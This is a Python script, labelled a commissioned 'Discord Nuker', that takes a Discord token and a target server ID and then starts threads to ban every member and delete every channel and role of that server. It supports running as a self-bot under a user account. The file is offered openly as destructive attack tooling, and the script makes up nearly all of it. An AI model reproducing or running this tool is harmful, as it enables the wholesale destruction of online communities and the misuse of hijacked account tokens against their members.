#   Developed by novuh.dev (c) 2021 ALL RIGHTS RESERVED
# |-----------------------------------------------------|
# | Commission Receipt:                                 |
# | Client            : northwest                       |
# | V3rm              : N/A                             |
# | Payment Amount    : 0                               |
# | Type              : Discord Nuker                   |
# | Resell Permission : No                              |
# |-----------------------------------------------------|

import os, discord, threading
import backend
from discord.ext import commands
from colorama import Fore, Style, Back
MAXWORKERS = 200

os.system('cls')
print(Fore.WHITE + Back.MAGENTA + Style.BRIGHT + "novuh's discord nuker | novuh.dev/discord".center(os.get_terminal_size().columns, " ") + Back.RESET)
os.system("title nuker (not connected!)")

print(Fore.RED + "   If you find any bugs, please join the Discord and report them. Thanks." + Fore.WHITE)
print("\n")
token = input("   Token -> ")
while True:
    isBot = input("   Are you using a bot? [y/n] -> ")
    if isBot == "y": isBot = True;break
    elif isBot == "n": isBot = False;break
    else: print("   ** Please provide a valid answer.")
while True:
    try: target = int(input("   Target Guild ID -> "));break
    except ValueError: print("   ** Please provide a number.")

nuker = backend.nuker(token, isBot)
intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix=">>>", help_command=None, self_bot=True, intents=intents) if isBot is not True else commands.Bot(command_prefix=">>>", help_command=None, self_bot=False, intents=intents)

@client.event
async def on_connect():
    os.system('cls')
    print(Fore.WHITE + Back.MAGENTA + Style.BRIGHT + "novuh's discord nuker | novuh.dev/discord".center(os.get_terminal_size().columns, " ") + Back.RESET)
    print("\n")
    os.system("title nuker (connected!)")
    print("   Waiting for client...")
    await client.wait_until_ready()
    print("   Client is ready.")
    print("   Preparing...")
    chunkhappened = False
    try:
        guild = client.get_guild(target)
        chunk = await guild.chunk()
        chunkhappened = True
    except AttributeError:
        print("   ** Could not get group members.")
    input("   Press ENTER to start.")

    if chunkhappened:
        for member in chunk:
            threading.Thread(target=nuker.ban, args=(target, member.id,)).start()
    if len(guild.channels) != 0 or None:
        for channel in guild.channels:
            threading.Thread(target=nuker.channel, args=(channel.id,)).start()
    if len(guild.roles) != 0 or None:
        for role in guild.roles:
            threading.Thread(target=nuker.role, args=(target, role.id,)).start()
    print(f"   All threads started.")

print("   Connecting...")
client.run(token)

